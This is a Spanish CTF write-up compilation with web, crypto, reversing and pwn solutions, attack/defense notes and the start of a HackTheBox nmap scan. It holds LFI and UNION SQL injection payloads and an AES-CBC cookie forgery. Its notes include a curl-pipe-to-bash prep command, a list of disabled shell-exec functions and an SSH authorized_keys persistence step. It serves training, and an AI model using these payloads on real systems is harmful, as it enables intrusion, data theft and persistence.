<p>Dado que los archivos php son procesados del lado del servidor y no se puede visualizar su contenido, fue necesario usar un <a href="https://www.php.net/manual/en/filters.convert.php">filtro de php</a> para poder extraer su contenido real, mediante la petición:</p>
<pre><code class="language-txt">/wrapper.php?page=php://filter/convert.base64-encode/resource=/var/www/flag.php
</code></pre>
<p>Extrayendo así el contenido del archivo encodeado en base64, para después desencodearlo y así encontrar el valor de la bandera.</p>
<p><img src="ctfs/20220922_ctf-core2022/images/web_cic_blog_6.png" alt="flag.php" /></p>
<pre><code class="language-bash">echo &quot;PHN0eWxlPgogICAgLnBlcnJpbiB7CiAgICAgICAgdGV4dC1zaGFkb3c6IDJweCAycHggcmVkOwogICAgfQo8L3N0eWxlPgo8ZGl2IGNsYXNzPSJtYWluLXdyYXBwZXIiPgo8aDEgY2xhc3M9InBlcnJpbiI+QWggcGVycmluIGxlIHNhYmVzIGFsIExGSTwvaDE+CjxoMiBjbGFzcz0icGVycmluIj5ObyBjcmVhcyBxdWUgdmEgYSBzZXIgdGFuIGbDoWNpbCBvYnRlbmVyIHR1IGZsYWc8L2gyPgo8P3BocAogICRmbGFnID0gIkxQTXs0aF9wM3JyMW5fbGYxXzRfN2gzX3cxbn0iOwoJZWNobygiwr9ZYSBwZW5zYXN0ZSBlbiBhbGdvIGRpZmVyZW50ZT8iKTsKPz4KPC9kaXY+&quot; | base64 -d
</code></pre>
<p><img src="ctfs/20220922_ctf-core2022/images/web_cic_blog_7.png" alt="flag.php desencodeado" /></p>
<p>Flag: <code>LPM{4h_p3rr1n_lf1_4_7h3_w1n}</code></p>
<h3 id="tacos-don-chano"><a class="header" href="#tacos-don-chano">Tacos Don Chano</a></h3>
<h4 id="info-4"><a class="header" href="#info-4">Info</a></h4>
<div class="table-wrapper"><table><thead><tr><th>Atributo</th><th>Valor</th></tr></thead><tbody>
<tr><td>Descripción</td><td>Me hice la promesa de ya entrar a mis clases de desarrollo web y le hice a mi tío Chano un sitio para que que pueda gestionar sus órdenes de tacos, pero de un momento a otro se ha estado comportando medio raro... y estoy teniendo errores inesperados, ¿qué crees que pueda estar mal?</td></tr>
<tr><td>Archivos</td><td><a href="https://github.com/srrequiem/CTF-Challenge-Compilation/tree/main/20220922_ipn_core_2022/files/web_tacos_don_chano.zip">web_tacos_don_chano.zip</a></td></tr>
</tbody></table>
</div>
<h4 id="solución-4"><a class="header" href="#solución-4">Solución</a></h4>
<p>Se permite interactuar con el sitio mediante un input que en resumen manda una petición a <code>/orden.php?id=1</code> indicando el supuesto id de la orden de tacos, modificando el id se pueden visualizar todas las órdenes disponibles en la plataforma la cuál se puede sospechar que está interactuando con una base de datos.</p>
<p>Enviando algún caracter diferente a un número (<code>/orden.php?id='</code>) se puede visualizar una excepción de SQL de la cuál se expone la versión/tipo de base de datos (SQLite3), dando paso a sospechar que se trata de una inyección SQL.</p>
<p><img src="ctfs/20220922_ctf-core2022/images/web_tacos_chano_1.png" alt="Excepción SQL" /></p>
<p>Por lo que se podría automatizar el proceso con <code>sqlmap</code> o hacer a mano mediante:</p>
<ol>
<li>Identificación de número de columnas.</li>
</ol>
<pre><code class="language-text">/orden.php?id=1 UNION SELECT 1,2,3-- -
</code></pre>
<p><img src="ctfs/20220922_ctf-core2022/images/web_tacos_chano_2.png" alt="Número de columnas" /></p>
<ol start="2">
<li>Identificación de columnas que permitan caracteres.</li>
</ol>
<pre><code class="language-text">/orden.php?id=1 UNION SELECT 'a','a','a'-- -
</code></pre>
<p><img src="ctfs/20220922_ctf-core2022/images/web_tacos_chano_3.png" alt="Columnas con caracteres" /></p>
<ol start="3">
<li>Identificación de tablas.</li>
</ol>
<pre><code class="language-text">/orden.php?id=1 UNION SELECT (SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'),'a','a'-- -

Y:

/orden.php?id=1 UNION SELECT (SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 2 offset 1),'a','a'-- -

Para identificar otras tablas.
</code></pre>
<p><img src="ctfs/20220922_ctf-core2022/images/web_tacos_chano_4.png" alt="Identificación de otras tablas" /></p>
<ol start="4">
<li>Identificación de nombre de columnas en tabla identificada (opcional).</li>
</ol>
<pre><code class="language-text">/orden.php?id=1 UNION SELECT (SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='flag'),'a','a'-- -
</code></pre>
<p><img src="ctfs/20220922_ctf-core2022/images/web_tacos_chano_5.png" alt="Columnas de tabla" /></p>
<ol start="5">
<li>Extracción de valores.</li>
</ol>
<pre><code class="language-text">/orden.php?id=1 UNION SELECT (SELECT * FROM flag),'a','a'-- -
</code></pre>
<p><img src="ctfs/20220922_ctf-core2022/images/web_tacos_chano_6.png" alt="Extracción de valores" /></p>
<p>Flag: <code>LPM{54l3n_2_d3_5u4p3rr0_p4r4_3l_j0v3n}</code></p>
<h2 id="crypto"><a class="header" href="#crypto">Crypto</a></h2>
<h3 id="encoding"><a class="header" href="#encoding">Encoding</a></h3>
<h4 id="info-5"><a class="header" href="#info-5">Info</a></h4>
<div class="table-wrapper"><table><thead><tr><th>Atributo</th><th>Valor</th></tr></thead><tbody>
<tr><td>Descripción</td><td>¿Qué tanto sabes de encoding?</td></tr>
<tr><td>Archivos</td><td><a href="https://github.com/srrequiem/CTF-Challenge-Compilation/tree/main/20220922_ipn_core_2022/files/crypto_encoding.txt">crypto_encoding.txt</a></td></tr>
</tbody></table>
</div>
<h4 id="solución-5"><a class="header" href="#solución-5">Solución</a></h4>
<p>Después de pasar el texto obtenido a <a href="https://gchq.github.io/CyberChef/">Cyberchef</a> se obtuvo el resultado de la <a href="https://gchq.github.io/CyberChef/#recipe=From_Base85(&#x27;!-u&#x27;,true)From_Base32(&#x27;A-Z2-7%3D&#x27;,false)From_Base64(&#x27;A-Za-z0-9%2B/%3D&#x27;,true,false)From_Hex(&#x27;None&#x27;)&amp;input=OG00Vl8xLzFEOjhRJi9OPSZgJ3I4ayhbLDEsYCZkOi9YVlE8RSlYSThsZTtLO2JdVlQ6LmVQZDc5PERmOUxXLGIxZmNBODduUTxROFFKTT84bTRuaDtiXjFjOi5lI1U1dV5mPThsXSJfMkhFMUs6ZUY4SDc5KXI7">receta</a>, mediante un múltiple encoding de bases: Base85 -&gt; Base32 -&gt; Base64 -&gt; A hexadecimal para por último obtener el valor de la bandera.</p>
<p><img src="ctfs/20220922_ctf-core2022/images/crypto_encoding_1.png" alt="Valor de bandera" /></p>
<p>Flag: <code>LPM{3nc0ding_iS_b4sIc}</code></p>
<h3 id="esoteric0"><a class="header" href="#esoteric0">Esoteric0</a></h3>
<h4 id="info-6"><a class="header" href="#info-6">Info</a></h4>
<div class="table-wrapper"><table><thead><tr><th>Atributo</th><th>Valor</th></tr></thead><tbody>
<tr><td>Descripción</td><td>¡¡Esto es del diablo!! ¿puedes recuperar la flag?</td></tr>
<tr><td>Archivos</td><td><a href="https://github.com/srrequiem/CTF-Challenge-Compilation/tree/main/20220922_ipn_core_2022/files/crypto_esoteric.txt">crypto_esoteric.txt</a></td></tr>
</tbody></table>
</div>
<h4 id="solución-6"><a class="header" href="#solución-6">Solución</a></h4>
<p>Después de repasar el nombre y la descripción se pudo identificar que se trataba de un <a href="https://en.wikipedia.org/wiki/Esoteric_programming_language">lenguaje de programación esotérico</a> y partiendo directamente de la descripción va acorde a la descripción que se puede leer en el lenguaje <strong>Malbolge</strong>. Por lo que al usar un <a href="https://malbolge.doleczek.pl/">intérprete de este lenguaje</a> se puede obtener el valor de la bandera pegando el contenido proporcionado y ejecutando el programa.</p>
<p><img src="ctfs/20220922_ctf-core2022/images/crypto_esoterico_1.png" alt="Valor de bandera" /></p>
<p>Flag: <code>LPM{3Xel3ntE_C0noC3s_LaS_4rTes_0scUr4s}</code></p>
<h3 id="aesy"><a class="header" href="#aesy">AESy</a></h3>
<h4 id="info-7"><a class="header" href="#info-7">Info</a></h4>
<div class="table-wrapper"><table><thead><tr><th>Atributo</th><th>Valor</th></tr></thead><tbody>
<tr><td>Descripción</td><td>¿Podrás romper la cookie y obtener acceso como admin?</td></tr>
<tr><td>Archivos</td><td><a href="https://github.com/srrequiem/CTF-Challenge-Compilation/tree/main/20220922_ipn_core_2022/files/crypto_aesy_chall.py">crypto_aesy_chall.py</a></td></tr>
</tbody></table>
</div>
<h4 id="solución-7"><a class="header" href="#solución-7">Solución</a></h4>
<p>Realizando un análisis al código fuente se identificó que al realizar el proceso de login se genera una cookie de sesión compuesta por 64 caracteres (en hexadecimal), de los cuales la mitad corresponde al <code>iv</code> que es utilizado en el proceso de cifrado y descifrado de la aplicación. Y la otra mitad a lo cifrado del usuario según las siguientes líneas de código:</p>
<p><img src="ctfs/20220922_ctf-core2022/images/crypto_aesy_1.png" alt="Creación de cookie" /></p>
<ol>
<li>Método de cifrado invocado.</li>
<li>Retorno de valor <code>iv</code> + texto cifrado.</li>
</ol>
<p>Al buscar vulnerabilidades con el método empleado de AES CBC se encontró el <a href="https://derekwill.com/2021/01/01/aes-cbc-mode-chosen-plaintext-attack/">blog</a> y el <a href="https://www.youtube.com/watch?v=QG-z0r9afIs">video</a> en donde se explica la razón de la vulnerabilidad que parte de conocer los bytes correspondientes del <code>iv</code> y los bytes de lo cifrado.</p>
<p>Dado que el proceso de AES CBC hace uso de XOR y se nos proporciona el resultado, en resumen bastaría en calcular el byte correspondiente de sólo una de las letras dado que espera obtener <code>admin</code>. Extrayendo la cookie de sesión generada con <code>bdmin</code> por medio de <code>/login?username=bdmin</code> se obtiene <code>53456027e7f7e1022fa753f620aeac956f8b13fcc80f33b5a5b6feb140b2878f</code>.</p>
<p><img src="ctfs/20220922_ctf-core2022/images/crypto_aesy_2.png" alt="Cookie obtenida" /></p>
<pre><code class="language-text">Cookie obtenida: 53456027e7f7e1022fa753f620aeac956f8b13fcc80f33b5a5b6feb140b2878f

IV (cookie): 53456027e7f7e1022fa753f620aeac95

Cifrado (cookie): 6f8b13fcc80f33b5a5b6feb140b2878f
</code></pre>
<p>Tomando en cuenta el proceso que sigue AES CBC lo que se necesitaría sería encontrar el valor del <code>iv</code> correspondiente para cambiar la <code>b</code> por <code>a</code> de <code>dmin</code> para ello se debería seguir:</p>
<pre><code class="language-text">Primer byte correspondiente de IV: 53
Primer byte correspondiente de lo cifrado: 6f
Valor de b en hexadecimal: 62

53 ^ (6f)? = 62

Para encontrar el valor correspondiente de lo cifrado se realiza el siguiente XOR:

53 ^ 62 = 31

Por lo tanto se puede decir que:

53 ^ 31 = 62

Conociendo este valor se puede buscar el varlo de IV que produciría a (61 en hexadecimal):

? ^ 31 = 61

De acuerdo a las propiedades el XOR se podría realizar la siguiente operación para encontrar el segmento faltante:

31 ^ 61 = ? (50)

Por lo tanto se puede decir que:

50 ^ 31 = 61
</code></pre>
<p>Tomando en cuenta lo anterior se podría sustituir el primer byte del <code>iv</code> de la cookie por 50 para obtener así la bandera.</p>
<p><img src="ctfs/20220922_ctf-core2022/images/crypto_aesy_3.png" alt="Obtención de bandera" /></p>
<p>Flag: <code>LPM{c0nOc3sl4||4v3_c13rt0?}</code></p>
<h3 id="realbabyrsa"><a class="header" href="#realbabyrsa">RealBabyRSA</a></h3>
<h4 id="info-8"><a class="header" href="#info-8">Info</a></h4>
<div class="table-wrapper"><table><thead><tr><th>Atributo</th><th>Valor</th></tr></thead><tbody>
<tr><td>Descripción</td><td>RSA... ¡que común!</td></tr>
<tr><td>Archivos</td><td><a href="https://github.com/srrequiem/CTF-Challenge-Compilation/blob/main/20220922_ipn_core_2022/files/crypto_real_baby_rsa_output.txt">crypto_real_baby_rsa_output.txt</a> <a href="https://github.com/srrequiem/CTF-Challenge-Compilation/blob/main/20220922_ipn_core_2022/files/crypto_real_baby_rsa_reto.py">crypto_real_baby_rsa_reto.py</a></td></tr>
</tbody></table>
</div>
<h4 id="solución-8"><a class="header" href="#solución-8">Solución</a></h4>
<p>Después de visualizar el código fuente y buscar un <a href="https://www.rose-hulman.edu/class/ma/holden/Archived_Courses/Math479-0304/resources/attacks-rsa/">resumen de los ataques a RSA</a> se puede percatar que ambos valores de la salida:</p>
<pre><code class="language-python">ct1=pow(FLAG,e1,n)
ct2=pow(FLAG,e2,n)
</code></pre>
<p>Estan usando el mismo módulo para las operaciones, por lo que al buscar dentro del resumen antes indicado se encontró <a href="https://infosecwriteups.com/rsa-attacks-common-modulus-7bdb34f331a5">este artículo</a> en donde se detalla un escenario similar y explica en dónde radica la vulnerabilidad, además de brindar el código fuente de la solución. Por lo que al hacer uso del script se obtiene la bandera.</p>
<p><img src="ctfs/20220922_ctf-core2022/images/crypto_real_baby_rsa_1.png" alt="Obtención de bandera" /></p>
<p>Flag: <code>LPM{P3rf3ctO!_c0N0c3s_Rs4_y_Sus_vuln3r4b1l1d4d3zzzz}</code></p>
<h3 id="baby-fa"><a class="header" href="#baby-fa">Baby-FA</a></h3>
<h4 id="info-9"><a class="header" href="#info-9">Info</a></h4>
<div class="table-wrapper"><table><thead><tr><th>Atributo</th><th>Valor</th></tr></thead><tbody>
<tr><td>Descripción</td><td>¿Seguirás el camino fácil?<br>La flag es en minúsculas</td></tr>
<tr><td>Archivos</td><td><a href="https://github.com/srrequiem/CTF-Challenge-Compilation/tree/main/20220922_ipn_core_2022/files/crypto_baby_fa.txt">crypto_baby_fa.txt</a></td></tr>
</tbody></table>
</div>
<h4 id="solución-9"><a class="header" href="#solución-9">Solución</a></h4>
<p>Al identificar el formato de la bandera al final del texto por deducción:</p>
<pre><code class="language-text">pkca: ksn{efliaetkag_hctekejcjag_ja_cfckegeg}
flag: lpm{efliaetkag_hctekejcjag_ja_cfckegeg}
</code></pre>
<p>Se concluyó que era algún tipo de sustitución por lo que se utilizó esta <a href="https://gchq.github.io/CyberChef/#recipe=Substitute(&#x27;abcdefghijklmnopqrstuvwxyz&#x27;,&#x27;ebadinshrdlcmmofqrpbuvwxyz&#x27;)&amp;input=a2NiYmVsYS10Y2dhaiBsaXJzYmRhaWNzaHIgZWcgYmhhIGFhZmFpZWwgYmFpbiBwZGkgbGRmZ2JpbWxiZWRmZyBkcCBsaXJzYmRhaWNzaGVsIHNpZW5lYmV1YWcgYmhjYiBlZnVka3VhIGtjYmJlbGFnLCBhZWJoYWkgZWYgYmhhIGxkZmdiaW1sYmVkZiBlYmdha3AgZGkgZWYgYmhhIGdhbG1pZWJyIHNpZGRwLiBrY2JiZWxhLXRjZ2FqIGxkZmdiaW1sYmVkZmcgY2lhIGxtaWlhZmJrciBlbnNkaWJjZmIgbGNmamVqY2JhZyBwZGkgc2RnYi15bWNmYm1uIGxpcnNiZGFpY3Noci4gbWZrZXZhIG5kaWEgb2VqYWtyIG1nYWogY2ZqIHZmZG9mIHNtdGtlbC12YXIgZ2xoYW5hZyBnbWxoIGNnIGJoYSBpZ2MsIGplcHBlYS1oYWtrbmNmIGRpIGFra2VzYmVsLWxtaXVhIGxpcnNiZGdyZ2JhbmfigJRvaGVsaCBsZG1raiwgYmhhZGlhYmVsY2trciwgdGEgamFwYWNiYWogbWdlZmEgZ2hkaSdnIGNrYWRpZWJobiBkZiBjIHltY2ZibW4gbGRuc21iYWnigJRnZG5hIGtjYmJlbGEtdGNnYWogbGRmZ2JpbWxiZWRmZyBjc3NhY2kgYmQgdGEgaWFnZWdiY2ZiIGJkIGNiYmNsdiB0ciB0ZGJoIGxrY2dnZWxjayBjZmogeW1jZmJtbiBsZG5zbWJhaWcuIHBtaWJoYWluZGlhLCBuY2ZyIGtjYmJlbGEtdGNnYWogbGRmZ2JpbWxiZWRmZyBjaWEgbGRmZ2VqYWlhaiBiZCB0YSBnYWxtaWEgbWZqYWkgYmhhIGNnZ21uc2JlZGYgYmhjYiBsYWliY2VmIG9ha2stZ2JtamVhaiBsZG5zbWJjYmVkZmNrIGtjYmJlbGEgc2lkdGthbmcgbGNmZmRiIHRhIGdka3VhaiBhcHBlbGVhZmJrci4KcGtjYToga3Nue2VmbGlhZXRrYWdfaGN0ZWtlamNqYWdfamFfY2Zja2VnZWd9">receta de cyberchef</a>, adicional buscando un tipo de fuerza bruta respecto a la sustitución se encontró esta <a href="https://planetcalc.com/8047/">calculadora en línea</a> en donde al copiar el texto dado se obtuvo el valor de la bandera.</p>
<p><img src="ctfs/20220922_ctf-core2022/images/crypto_baby_fa_1.png" alt="Obtención de bandera" /></p>
<p>Flag: <code>lpm{increibles_habilidades_de_analisis}</code></p>
<h2 id="reversing"><a class="header" href="#reversing">Reversing</a></h2>
<h3 id="t3sla"><a class="header" href="#t3sla">T3SLA</a></h3>
<h4 id="info-10"><a class="header" href="#info-10">Info</a></h4>
<div class="table-wrapper"><table><thead><tr><th>Atributo</th><th>Valor</th></tr></thead><tbody>
<tr><td>Descripción</td><td>Cadena fue de visita a la ESCOM en su nuevo Tsl4. Pero olvidó sus llaves en el laboratorio de redes y estará cerrado hasta mañana por el paro :( . Por suerte tu eres su amigo y le ayudarás a abrir el auto. Lo primero será revisar el firmware buscando la función encargada de validar la llave.</td></tr>
<tr><td>Archivos</td><td><a href="https://github.com/srrequiem/CTF-Challenge-Compilation/tree/main/20220922_ipn_core_2022/files/reversing_t3sla_chall">reversing_t3sla_chall</a></td></tr>
</tbody></table>
</div>
<h4 id="solución-10"><a class="header" href="#solución-10">Solución</a></h4>
<p>Al pasar el binario por ghidra y ver la función indicada (<code>chequeo</code>) se pueden visualizar múltiples variables con valores hexadecimales, al convertir los valores se puede extraer la bandera, considerando que la distribución de los valores se encuentra en little-endian:</p>
<p><img src="ctfs/20220922_ctf-core2022/images/rev_tesla_1.png" alt="Variables en hexadecimal" /></p>
<p><img src="ctfs/20220922_ctf-core2022/images/rev_tesla_2.png" alt="Conversión de hexadecimal a ascii" /></p>
<p>Flag: <code>flag{Fl4G_0cULtA-R3vErS1n}</code></p>
<h3 id="t3sla---parte-2"><a class="header" href="#t3sla---parte-2">T3SLA - Parte 2</a></h3>
<h4 id="info-11"><a class="header" href="#info-11">Info</a></h4>
<div class="table-wrapper"><table><thead><tr><th>Atributo</th><th>Valor</th></tr></thead><tbody>
<tr><td>Descripción</td><td>Cuando la llave se comunica con el auto lo primero que hace es enviar una clave de 4 dígitos (que llegan a la función de chequeo como los primeros 4 parámetros).  ¿Cuáles son esos 4 dígitos correctos? <br> La flag es: flag{EncontrasteMiPin=PIN} Reemplazando PIN por los 4 dígitos correctos. <br> <strong>NOTA: Para este reto deberás utilizar los mismo archivos del reto T3SLA</strong></td></tr>
<tr><td>Archivos</td><td>-</td></tr>
</tbody></table>
</div>
<h4 id="solución-11"><a class="header" href="#solución-11">Solución</a></h4>
<p>Posteriormente en la misma función de <code>chequeo</code> se verifican el PIN 1 a 1 respecto los argumentos recibidos, completando así el PIN que se verifica.</p>
<p><img src="ctfs/20220922_ctf-core2022/images/rev_tesla_3.png" alt="Validación de PIN" /></p>
<p>Flag: <code>flag{EncontrasteMiPin=7395}</code></p>
<h3 id="t3sla---parte-3"><a class="header" href="#t3sla---parte-3">T3SLA - Parte 3</a></h3>
<h4 id="info-12"><a class="header" href="#info-12">Info</a></h4>
<div class="table-wrapper"><table><thead><tr><th>Atributo</th><th>Valor</th></tr></thead><tbody>
<tr><td>Descripción</td><td>Ahora que conocemos el PIN, lo único que nos resta para poder abrir el auto es conocer el password que se envía junto a la clave de 4 dígitos. Esta password la lee la misma función de chequeo. La flag es la password. <br> ej.  flag{PASSWORD} <br> <strong>NOTA: Para este reto deberás utilizar los mismo archivos del reto T3SLA</strong></td></tr>
<tr><td>Archivos</td><td>-</td></tr>
</tbody></table>
</div>
<h4 id="solución-12"><a class="header" href="#solución-12">Solución</a></h4>
<p>Dándole seguimiento al código fuente obtenido, se puede ver que:</p>
<ol>
<li>Se realiza una validación respeto al tamaño de la variable donde será almacenada la contraseña, validando que sea de 28 caracteres (0x1c).</li>
<li>Del valor que se pone se realiza un XOR de cada uno de sus elementos.</li>
<li>Se realiza otra validación en memoria si</li>
</ol>
<p>Flag: <code>flag{}</code></p>
<h2 id="pwning"><a class="header" href="#pwning">Pwning</a></h2>
<h3 id="babypwn"><a class="header" href="#babypwn">BabyPWN</a></h3>
<h4 id="info-13"><a class="header" href="#info-13">Info</a></h4>
<div class="table-wrapper"><table><thead><tr><th>Atributo</th><th>Valor</th></tr></thead><tbody>
<tr><td>Descripción</td><td>Este es otro reto de PWN más, pero no te apures te estaré guiando :) <br> El primer paso para conseguir RCE es buscar algún bug de corrupción de memoria que nos permita tomar control del flujo de ejecución. <br> ¡Suerte!</td></tr>
<tr><td>Archivos</td><td><a href="https://github.com/srrequiem/CTF-Challenge-Compilation/tree/main/20220922_ipn_core_2022/files/pwn_babypwn_chall">pwn_babypwn_chall</a> <a href="https://github.com/srrequiem/CTF-Challenge-Compilation/tree/main/20220922_ipn_core_2022/files/pwn_babypwn_chall.c">pwn_babypwn_chall.c</a></td></tr>
</tbody></table>
</div>
<h4 id="solución-13"><a class="header" href="#solución-13">Solución</a></h4>
<h3 id="babypwn---parte-2"><a class="header" href="#babypwn---parte-2">BabyPWN - Parte 2</a></h3>
<h4 id="info-14"><a class="header" href="#info-14">Info</a></h4>
<div class="table-wrapper"><table><thead><tr><th>Atributo</th><th>Valor</th></tr></thead><tbody>
<tr><td>Descripción</td><td>Para mala suerte la función cuenta con un mecanismo de seguridad conocido como stack canary que es una variable en la pila con un valor que si se modifica entonces el programa sabe que esta bajo un posible ataque. La buena noticia es que este stack canary tiene siempre el mismo valor.  Esta vez, cuando hagas el overflow asegúrate de escribir sobre el stack canary el valor correcto. <br> <strong>NOTA: Para este reto deberás utilizar los mismo archivos del reto BabyPWN</strong></td></tr>
<tr><td>Archivos</td><td>-</td></tr>
</tbody></table>
</div>
<h4 id="solución-14"><a class="header" href="#solución-14">Solución</a></h4>
<h3 id="babypwn---parte-3"><a class="header" href="#babypwn---parte-3">BabyPWN - Parte 3</a></h3>
<h4 id="info-15"><a class="header" href="#info-15">Info</a></h4>
<div class="table-wrapper"><table><thead><tr><th>Atributo</th><th>Valor</th></tr></thead><tbody>
<tr><td>Descripción</td><td>Como último paso necesitamos controlar ese flujo de ejecución;  por suerte, el programa imprime la cadena que le dimos usando la función system y como parámetro le pasa una cadena que almacena... ¡¡¡EN LA PILA!!!,  por lo que con nuestro overflow podremos modificar ese argumento para ejecutar system con lo que nosotros queramos ¡Suerte! :) <br> <strong>NOTA: Para este reto deberás utilizar los mismo archivos del reto BabyPWN</strong></td></tr>
<tr><td>Archivos</td><td>-</td></tr>
</tbody></table>
</div>
<h4 id="solución-15"><a class="header" href="#solución-15">Solución</a></h4>
<h2 id="misc"><a class="header" href="#misc">Misc</a></h2>
<h3 id="bot-calculadora"><a class="header" href="#bot-calculadora">Bot Calculadora</a></h3>
<h4 id="info-16"><a class="header" href="#info-16">Info</a></h4>
<div class="table-wrapper"><table><thead><tr><th>Atributo</th><th>Valor</th></tr></thead><tbody>
<tr><td>Descripción</td><td>Acabamos de descubrir e implementar una característica de Node.js del módulo vm y creamos una calculadora para usarlo, échale un lente crack. <br> <em><strong>NOTA: ÉSTE RETO TIENE PUNTAJE DINÁMICO,  MIENTRAS MÁS PERSONAS LO RESUELVAN EL PUNTAJE IRÁ DISMINUYENDO</strong></em> <br> https://t.me/node_vm_bot</td></tr>
<tr><td>Archivos</td><td><a href="https://github.com/srrequiem/CTF-Challenge-Compilation/tree/main/20220922_ipn_core_2022/files/misc_bot_bot_calculadora.zip">misc_bot_bot_calculadora.zip</a></td></tr>
</tbody></table>
</div>
<h4 id="solución-16"><a class="header" href="#solución-16">Solución</a></h4>
<div style="break-before: page; page-break-before: always;"></div><h1 id="cyber-mayhem"><a class="header" href="#cyber-mayhem">Cyber Mayhem</a></h1>
<h2 id="todo"><a class="header" href="#todo">TODO</a></h2>
<ul>
<li>Hardening de Tomcat.</li>
<li>Buscar métodos de persistencia.</li>
<li>Parchar LFI en PHP.</li>
</ul>
<h2 id="preparación"><a class="header" href="#preparación">Preparación</a></h2>
<p>prep.sh</p>
<ul>
<li>Falta levantar el webserver.</li>
</ul>
<pre><code class="language-bash">#!/bin/bash
sshpass -p $2 ssh -o GlobalKnownHostsFile=/dev/null -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -t root@$1 &quot;chmod -s /usr/bin/pkexec; cat /etc/sudoers; curl $3/sudoers.sh | bash; bash -l&quot;
</code></pre>
<p>sudoers.sh</p>
<pre><code class="language-bash">#!/bin/bash
grep -v -E &quot;^root|Defaults|#|%|^s|^$&quot; /etc/sudoers | while read -r entry; do user=$(echo $entry | awk '{print $1}'); substitution=$(echo $entry | sed &quot;s/([^)]*)/($user)/g&quot;); sed -i &quot;s|$entry|$substitution|g&quot; /etc/sudoers; done
</code></pre>
<h2 id="blue-team"><a class="header" href="#blue-team">Blue Team</a></h2>
<h3 id="monitoreo"><a class="header" href="#monitoreo">Monitoreo</a></h3>
<pre><code class="language-bash">ps # Identificar sesión de ssh
ps -aux --forest # Ver procesos con sus hijos
w # Visualizar usuarios logueados
who # Visualizar usuarios logueados
</code></pre>
<h3 id="apache"><a class="header" href="#apache">Apache</a></h3>
<h4 id="phpini"><a class="header" href="#phpini">PHP.ini</a></h4>
<p>Rutas:</p>
<ul>
<li><code>/etc/php.ini</code>.</li>
<li><code>/etc/php/&lt;version&gt;/apache2/php.ini</code>.</li>
</ul>
<pre><code class="language-bash">disable_functions = exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source

# Después de guardar cambios, reiniciar servicio
systemctl restart apache2
</code></pre>
<p>Probar si no afecta el healthcheck:</p>
<pre><code class="language-bash">allow_url_fopen = Off
allow_url_include = Off
</code></pre>
<h3 id="samba"><a class="header" href="#samba">Samba</a></h3>
<p>Rutas:</p>
<ul>
<li><code>/etc/samba/smb.conf</code>.</li>
</ul>
<pre><code class="language-bash">[global]
map to guest = never # Deshabilita sesión nula
usershare allow guests = no # Deshabilita sesión de guests
restrict anonymous = 2 # Probar con healthcheck

[myshare] # Probar con healthcheck
writeable = no
browseable = no
public = no
</code></pre>
<h3 id="ftp"><a class="header" href="#ftp">FTP</a></h3>
<p><em>La configuración depende de que servicio de FTP se esté ejecutando.</em></p>
<p>Rutas:</p>
<ul>
<li><code>/etc/vsftpd.conf</code></li>
</ul>
<pre><code class="language-bash"># /etc/vsftpd.conf
anonymous_enable=NO
write_enable=NO
anon_upload_enable=NO

# Ruta expuesta en FTP
chmod 755 /tmp/ftp # Probar healthcheck
</code></pre>
<h2 id="red-team"><a class="header" href="#red-team">Red Team</a></h2>
<h3 id="persistencia"><a class="header" href="#persistencia">Persistencia</a></h3>
<h4 id="ssh"><a class="header" href="#ssh">SSH</a></h4>
<p>Local:</p>
<pre><code class="language-bash">ssh-keygen -t rsa # Crear llave privada
cat id_rsa.pub | xclip -sel c
</code></pre>
<p>Intrusión:</p>
<pre><code class="language-bash">echo '&lt;pegar clipboard&gt;' &gt; &lt;ruta de usuario&gt;/.ssh/authorized_keys
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="estadísticas-2"><a class="header" href="#estadísticas-2">Estadísticas</a></h1>
<div class="table-wrapper"><table><thead><tr><th>Característica</th><th>Descripción</th></tr></thead><tbody>
<tr><td>Nombre</td><td><a href="https://www.hackthebox.com/home/machines/profile/148">Active</a></td></tr>
<tr><td>OS</td><td>Windows</td></tr>
<tr><td>Dificultad oficial</td><td>Easy</td></tr>
<tr><td>Dificultad de comunidad</td><td><img src="htb/boxes/windows/1_facil/Active/images/difficulty.png" alt="Dificultad" /></td></tr>
<tr><td>Puntos</td><td>20</td></tr>
<tr><td>Creadores</td><td><a href="https://www.hackthebox.com/home/users/profile/302">eks</a> &amp; <a href="https://www.hackthebox.com/home/users/profile/2984">mrb3n</a></td></tr>
</tbody></table>
</div>
<h1 id="reconocimiento-2"><a class="header" href="#reconocimiento-2">Reconocimiento</a></h1>
<h2 id="escaneo-de-host-2"><a class="header" href="#escaneo-de-host-2">Escaneo de host</a></h2>
<h3 id="escaneo-completo-de-puertos-2"><a class="header" href="#escaneo-completo-de-puertos-2">Escaneo completo de puertos</a></h3>
<pre><code class="language-bash">❯ nmap -T5 -vvv -open -p- -n -Pn -oG nmap/allPorts $TARGET
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-19 20:29 EST
Initiating Connect Scan at 20:29
Scanning 10.10.10.100 [65535 ports]
Discovered open port 135/tcp on 10.10.10.100
Discovered open port 445/tcp on 10.10.10.100
Discovered open port 53/tcp on 10.10.10.100
Discovered open port 139/tcp on 10.10.10.100
Discovered open port 49152/tcp on 10.10.10.100
Discovered open port 464/tcp on 10.10.10.100
Discovered open port 49157/tcp on 10.10.10.100
Discovered open port 593/tcp on 10.10.10.100
Discovered open port 3269/tcp on 10.10.10.100
Discovered open port 49165/tcp on 10.10.10.100
Discovered open port 88/tcp on 10.10.10.100
Discovered open port 49167/tcp on 10.10.10.100
Discovered open port 3268/tcp on 10.10.10.100
Discovered open port 389/tcp on 10.10.10.100
Warning: 10.10.10.100 giving up on port because retransmission cap hit (2).
Discovered open port 49155/tcp on 10.10.10.100
Discovered open port 636/tcp on 10.10.10.100
Discovered open port 49158/tcp on 10.10.10.100
Discovered open port 49154/tcp on 10.10.10.100
Discovered open port 5722/tcp on 10.10.10.100
Discovered open port 49153/tcp on 10.10.10.100
Discovered open port 49166/tcp on 10.10.10.100
Discovered open port 9389/tcp on 10.10.10.100
Completed Connect Scan at 20:29, 28.58s elapsed (65535 total ports)
Nmap scan report for 10.10.10.100
Host is up, received user-set (0.065s latency).
Scanned at 2022-01-19 20:29:16 EST for 29s
